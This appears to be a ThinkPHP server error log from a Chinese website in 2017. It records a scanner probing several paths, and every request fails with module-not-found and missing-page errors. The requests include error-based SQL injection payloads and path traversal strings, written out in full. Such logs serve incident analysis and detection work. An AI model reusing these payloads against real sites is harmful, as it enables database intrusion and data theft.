[ 2017-10-17T23:18:39+08:00 ] 182.118.33.7 /Public/Home/index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: [ app_init ] --END-- [ RunTime:0.000503s ]
ERR: 无法加载模块:Search
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:18:41+08:00 ] 182.118.33.7 /Public/bs/index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000028s ]
INFO: [ app_init ] --END-- [ RunTime:0.000596s ]
ERR: 无法加载模块:Search
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:18:43+08:00 ] 182.118.33.7 /Public/index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000526s ]
ERR: 无法加载模块:Search
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:18:46+08:00 ] 182.118.33.7 /Public/Home/index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
INFO: [ app_init ] --END-- [ RunTime:0.000778s ]
ERR: 无法加载模块:Link
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:18:49+08:00 ] 182.118.33.7 /Public/bs/index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000498s ]
ERR: 无法加载模块:Link
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:18:51+08:00 ] 182.118.33.7 /Public/index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000496s ]
ERR: 无法加载模块:Link
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:18:59+08:00 ] 182.118.33.7 /Common/index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000523s ]
ERR: 无法加载模块:Search
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:19:02+08:00 ] 182.118.33.7 /Goods/index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
INFO: [ app_init ] --END-- [ RunTime:0.000784s ]
ERR: 无法加载模块:Search
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:19:19+08:00 ] 182.118.33.7 /Public/bs/index.php?m=poster&c=index&a=poster_click&id=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000787s ]
ERR: 无法加载模块:Poster
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

[ 2017-10-17T23:19:24+08:00 ] 182.118.33.7 /Goods/index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000845s ]
ERR: 无法加载模块:Link
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(__PUBLIC__/404.html): failed to open stream: No such file or directory /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.
NOTIC: [2] include(): Failed opening '__PUBLIC__/404.html' for inclusion (include_path='.:/usr/local/php53/lib/php') /home/flyindat/domains/flyindata.com.cn/public_html/ThinkPHP/Library/Think/Think.class.php 第 314 行.

